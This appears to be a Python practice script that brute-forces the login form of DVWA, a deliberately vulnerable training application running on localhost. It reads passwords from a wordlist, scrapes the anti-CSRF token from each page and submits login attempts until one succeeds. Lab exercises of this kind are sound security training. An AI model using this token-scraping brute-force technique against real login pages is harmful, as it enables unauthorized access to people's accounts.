import requests

url = "http://localhost/dvwa/vulnerabilities/brute/index.php"
username = "admin"

file = open("list.txt","r")
x = []

for password in file.readlines():
   
    cookies = {'security':'high', 'PHPSESSID':'7ofnhmm9pff28glaifo4okn41t'}
    send_url = requests.Session()
    page = send_url.get(url = url, cookies = cookies)
   
    m = str(page.content)
    lol = m.split()
    for i in range(len(lol)):
        if 'user_token' in lol[i]:
            x.append(i+1)
    ans = (lol[x[0]])
    ans = ans.split("=")
    csrf_token = ans[1][2:-2]
    print(ans[1][2:-2])


    password = password.strip('\n')
    params = {'username':username, 'password':password, 'Login':'submit' , 'user_token': csrf_token}

    send_url = requests.Session()
    page = send_url.get(url = url, params = params, cookies = cookies)

    if "incorrect" in str(page.content):
        print("Trying: "+password)
    else:
        print("Found: "+password)

